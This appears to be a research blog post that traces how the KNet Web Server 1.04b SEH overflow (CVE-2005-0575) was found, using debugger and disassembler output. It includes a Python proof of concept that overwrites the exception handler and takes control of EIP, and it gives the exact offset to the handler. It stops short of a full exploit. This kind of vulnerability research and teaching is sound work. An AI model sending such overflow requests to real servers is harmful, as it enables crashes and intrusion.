---
layout: post
title: Tracing the KNET SEH Overflow (CVE-2005-0575)
tags: [Research, RE]
author: mqt @ Ingredous Labs
comment: true
---

# Tracing the KNET SEH Overflow (CVE-2005-0575)

## Preface

Leveraging a buffer overflow to achieve successful exploitation is only half the battle, the other half is discovering the overflow in the first place. As such, the purpose of this blog post is to provide a walkthrough on discovering the overflow affecting [KNet Web Server 1.04b](https://www.techspot.com/downloads/569-knet.html) aka `CVE-2005-0575`.

## Exploitation

Throughout this blog post a hybrid combination of a static and dynamic analysis will be used to demonstrate the reversing process. [WinDbg](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/) will be used as the debugger while [IDA Pro](https://hex-rays.com/ida-pro/) as the disassembler.

The initial step involves identifying how user input entered the memory. In the case of the `KNET` application, being an `HTTP` server and with the overflow triggered via an `HTTP` request, the focus turned to sockets. Since `KNET` is a portable executable, it is likely utilizing the `Winsock API`, which facilitates communication between applications over the network. In this particular scenario, as `HTTP` employs `TCP` as the underlying transport protocol, the specific method function to investigate would be the `recv()` function, which does the following:

```
The recv function receives data from a connected socket or a bound connectionless socket.

source: https://learn.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv
```

When inspecting the `Imports` section in `IDA`, the `recv()` function is found. When analyzing the cross-references to `recv()`, there are only two calls to `recv()` discovered. This discovery is beneficial as it is expected to significantly reduce the time required for reverse engineering:

![Screenshot]({{ site.baseurl }}/images/posts/2020/knet/2023-05-28-10-50-27.png)

Setting breakpoints at both calls using `WinDBG`, the following Python script is fired off which simply just sends an `HTTP` request over the socket should in-turn trigger one of the breakpoints:

```python
request = b "W00T / HTTP/1.0\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 80))
s.send(request)
s.close()
```

After the script is ran, one of the breakpoints is indeed hit:

```text
KNet+0x8b36:
00408b36 e8794d0000      call    KNet+0xd8b4 (0040d8b4)
```

Upon closer examination, it appears that the breakpoint hit corresponds to the second invocation of the `recv()` function. By analyzing the last four items on the stack, valuable insights can be obtained regarding the arguments passed to the `recv()` call. 

The function prototype for `recv()` is as follows:

```c
int recv(
  [in]  SOCKET s,
  [out] char   *buf,
  [in]  int    len,
  [in]  int    flags
);
```

```text
0:000> dds esp L4
0014fef8  00000af0    // socket descriptor
0014fefc  0014ff34    // buffer
0014ff00  00000008    // bytes to read
0014ff04  00000002    // flags
```

One of the key aspects to examine is the buffer, which acts as the storage for the data read from the socket. In the given context, it is represented as the second argument aka `0x0014ff34`. Another crucial parameter is the length argument, which specifies the number of bytes to be read from the socket, which in this case is 8.

In this scenario, reading only 8 bytes from the socket is insufficient to result in any form of exploitation. To verify this further, we can proceed by stepping over the `recv()` call and examining the bytes extracted from the address of the buffer mentioned earlier. This allows us to observe the content retrieved from the socket:

```text
0:000> db 0014ff34 L8
0014ff34  77 30 30 74 20 2f 20 48       w00t / H
```

As indicated in the output provided, it is evident that only the `HTTP` method and a few subsequent bytes were successfully read from the socket. 

After resuming execution of the program, the second call to `recv()` is now triggered:

```text
KNet+0x8a02:
00408a02 e8ad4e0000      call    KNet+0xd8b4 (0040d8b4)
```

Let's perform the same steps as earlier and examine the stack to learn more about the arguments being passed to the `recv()` call:

```text
0:000> dds esp L4
0014ff18  00000af0    // socket descriptor
0014ff1c  005505a8    // buffer
0014ff20  00002710    // bytes to read
0014ff24  00000000    // flags
```

Something that explicitly stands out here is the amount of bytes to read which is `0x2710` aka `0n10000` which relatively speaking can be considered a large buffer. Side-tangent: Interestingly enough `RFC 1945` does not define a specific maximum size limit for an `HTTP` request; rather it's up the server to impose the maximum size. 

After stepping over the `recv()` call and then dumping the buffer, we can see that the full non-truncated `HTTP` request which was sent via the Python script was saved to memory:

```text
0:000> db 005505a8
005505a8  77 30 30 74 20 2f 20 48-54 54 50 2f 31 2e 30 0d  w00t / HTTP/1.0.
005505b8  0a 0d 0a 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
005505c8  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
005505d8  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
```

With this in mind, let's see a hardware breakpoint on the address of the buffer so that whenever the program attempts to read or write to the buffer, execution will be paused:

```text
0:000> ba r 4 0x05505a8
```

The breakpoint is triggered shortly thereafter:

```text
KNet+0x4f1f:
00404f1f 40              inc     eax
```

Jumping to `0x00404f1f` within `IDA`, the following basic blocks are shown:

![Screenshot]({{ site.baseurl }}/images/posts/2020/knet/2023-05-28-11-18-31.png)

The observed operation involves a loop that performs byte-by-byte copying from the memory address pointed to by the `EAX` register into the `ch` register, which forms the lower 16 bits of the `ECX` register:

```text
.text:00404F1D mov     ch, [eax]
```

Aftewards the memory address pointed to by the `EAX` register is incremented by 1:

```text
.text:00404F1F inc     eax
```

Then the byte which was originally copied into the `ch` register is then moved to the memory address pointged by the `EDX` register:

```text
.text:00404F20 mov     [edx], ch
```

`EDX` is then incremented by one as well:

```text
.text:00404F22 inc     edx
```

Lastly the value of `ch` is compared to `0`, and if the value is anything but zero, the loop jumps back to the start:

```text
.text:00404F23 cmp     ch, 0
.text:00404F26 jnz     short loc_404F1D
```

The utilization of `0` as the comparison value in this context is due to the buffer which is responsible for storing the `HTTP` request was pre-initialized with zeroes. Consequently, encountering a `0` signifies the end of the data copied into the buffer; meaning that `0x00` would definitely be a bad character here.

Still there doesn't appear to be anything inherently dangerous about this loop, so we will keep tracing the flow of the user-input until it eventually reaches the sink.

After a series of benign copy and logical operations, the program flow eventually reaches the `sub_40CFA0` function, where a call to the `strcpy()` function is made:

![Screenshot]({{ site.baseurl }}/images/posts/2020/knet/2023-05-28-11-46-44.png)

Let's set a breakpoint on the `strcpy()` function call and when it's triggered, examine the arguments passed to the function:

```text
0:000> dds esp L2
0014f97c  0014fad4    // dest
0014f980  01992f60    // src
```

Upon examining the `src` buffer, it shows that it holds a path to the `index.html` file, as well as contents of the `HTTP` request meaning it is passing user-input!

```text
0:000> db 01992f60 L90
01992f60  43 3a 5c 50 72 6f 67 72-61 6d 20 46 69 6c 65 73  C:\Program Files
01992f70  5c 4b 4e 65 74 5c 69 6e-64 65 78 2e 68 74 6d 6c  \KNet\index.html
01992f80  00 00 00 00 00 00 00 00-6d 9a b6 c8 07 13 00 08  ........m.......
01992f90  c0 0a 7b 01 60 0e 7b 01-0a 00 00 00 c0 d0 e0 f0  ..{.`.{.........
01992fa0  b6 b7 ce 48 1f 00 00 00-ac 2f 99 01 00 40 00 80  ...H...../...@..
01992fb0  f0 bd 83 4a 00 00 00 80-05 00 00 05 07 13 00 00  ...J............
01992fc0  a0 04 99 01 00 0b 99 01-00 00 00 00 00 00 00 00  ................
01992fd0  fc bd 8f 4a 00 01 00 80-77 30 30 74 20 2f 20 48  ...J....w00t / H
01992fe0  54 54 50 2f 31 2e 30 0d-0a 0d 0a 00 8c 00 99 01  TTP/1.0.........
...
```

However there's something interesting to note about the location of the destination buffer, specifically the address: `0x0014fad4`.

The reason it's interesting is because when examining the `Thread Environment Block`:

```text
0:000> !teb
TEB at 00390000
    ExceptionList:        0014ffcc
    StackBase:            00150000
    StackLimit:           00145000
```

It is crucial to make note of the address of the `ExceptionList`. This is significant because the `ExceptionList` serves as a pointer to the head of the `Structured Exception Handling (SEH) chain`, which is implemented as a linked-list data structure.
 
In case you're unfamiliar with `SEH`, basically it is a mechanism in the Windows OS which is designed to handle exceptions (both software and hardware). Each individual `SEH` record points to an `exception handler` function which is designed to deal with the unexpected event. So whenever an exception occurs, the operating system will walk to the `SEH` chain and invoke every `exception handler` until either one is found that is able to successfully deal with the exception or the default handler is reached (the last node in the list). If the default handler is reached, this will result in the operating system terminating the current process (or thread).

What makes `SEH` so valuable for an attacker is specifically the `exception handler`.  By overwriting the address of one of the `exception handlers` and triggering an exception within the program, the operating system will execute the overwritten `exception handler`. This effectively will result in granting the attacker control over the program's flow. For a great primer regarding exploiting `SEH`, please refer to the [following resource](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/seh-based-buffer-overflow).

One last thing to note is that the `SEH` lives at the base of the stack meaning at a higher memory address (remember the stack grows downward towards lower memory addresses). The diagram below will provide a clearer visual representation:

![Screenshot]({{ site.baseurl }}/images/posts/2020/knet/2023-05-28-12-16-27.png)

Going back to the address of the `ExceptionList` which is `0x0014ffcc`. Now examine the address of the destination buffer, it is `0x0014fad4`. This means the distance between the destination buffer and the `ExceptionList` is only `0x4F8` bytes aka `0n1272` which is very close! Furthermore as the address of the destination buffer is lower than the address of the `ExceptionList`, this means that if a large enough input is supplied (in this case 1276 bytes, the first address of the `exception_handler` is the `ExceptionList + 4`), it can overwrite the first exception handler!

Here's the same diagram shown earlier though this time denoting how the overflow would appear (as shown by red):

![Screenshot]({{ site.baseurl }}/images/posts/2020/knet/2023-05-30-09-26-51.png)

To verify our hypothesis, let's refactor the Python code which is responsible for sending the `HTTP` request:

```python
request  = b"\x41" * 1300 + b" / HTTP/1.0\r\n\r\n"
```

This will result in the `HTTP` request containing 1300 arbitrary `A` characters, which if our hypotheis is correct, should overwrite the start of the `SEH` chain.

Setting a breakpoint at the `strcpy()` call will once again allow us to examine the arguments passed to the call:

```text
0:000> dds esp L2
0014f97c  0014fad4    // dest
0014f980  019938b0    // src
```

Examining the `src` buffer, shows it contains our user-input:

```text
0:000> db 019938b0
019938b0  43 3a 5c 50 72 6f 67 72-61 6d 20 46 69 6c 65 73  C:\Program Files
019938c0  5c 4b 4e 65 74 5c 41 41-41 41 41 41 41 41 41 41  \KNet\AAAAAAAAAA
019938d0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
019938e0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
019938f0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
01993900  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
01993910  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
01993920  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
```

Examining the first record in the `SEH` chain still shows the handle is in-tact:

```text
0:000> !teb
TEB at 00390000
    ExceptionList:        0014ffcc
    ...

0:000> dt _EXCEPTION_REGISTRATION_RECORD 0014ffcc
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x0014ffe4 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x77767390     _EXCEPTION_DISPOSITION  ntdll!_except_handler4+0
```

Stepping over the call to `strcpy()`, we can re-examine the first record in the `SEH` chain:

```
0:000> dt _EXCEPTION_REGISTRATION_RECORD 0014ffcc
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x41414141 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x41414141     _EXCEPTION_DISPOSITION  +41414141
```

As shown above, both the `Next` and `Handler` were overwritten by user-input!

Mentioned earlier that in order to trigger the `SEH` chain, an exception has to be raised. Typically when you have the ability to overwrite the `SEH` chain, it will overwrite some crucial pointers along the way which will result in an exception being raised.

After resuming the program, an `Access violation` is immediately raised resulting in Windows to traverse the `ExceptionList`, eventually invoking the overwritten exception handler. This sequence of events grants the attacker the ability to gain control of `EIP`:

```text
(1d9c.1894): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=ffffffff ebx=00000000 ecx=0789d43e edx=00000001 esi=0014ff24 edi=00401000
eip=41414141 esp=0014fee0 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210246
41414141 ??              ???
```

## Conclusion

As the primary objective of this blog post was to provide a comprehensive walkthrough on tracing the source of a vulnerability to the exploitation sink, the process of achieving successful exploitation is left as an excercise for the readers.

Thanks for reading.
